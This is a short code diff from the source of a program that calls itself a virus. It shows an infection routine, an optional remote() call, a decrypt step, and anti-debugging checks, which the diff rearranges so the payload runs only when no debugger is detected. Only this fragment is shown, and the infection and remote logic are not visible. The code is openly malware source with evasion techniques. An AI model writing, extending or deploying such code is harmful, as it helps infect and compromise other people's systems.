@@ -56,10 +56,12 @@ void do_infection(){
 }
 
 int virus(int ac, char **av){
-	if (checkdebug())
-	{
-		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
-	}
+	//if (check_prop("test--not--exist") == FALSE)
+	//{
+	//	print("PROC TEST\n");
+	//	return TRUE;
+	//}
+
 	if (opt.do_remote) remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
@@ -68,5 +70,11 @@ int virus(int ac, char **av){
 }
 
 int main(int ac, char **av){
-	return checkdebug() == 0 && decrypt() && virus(ac, av);
+	if (checkdebug() == 0)
+	{
+		return decrypt() && virus(ac, av);
+	}
+	else
+		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
+	return (0);
 }
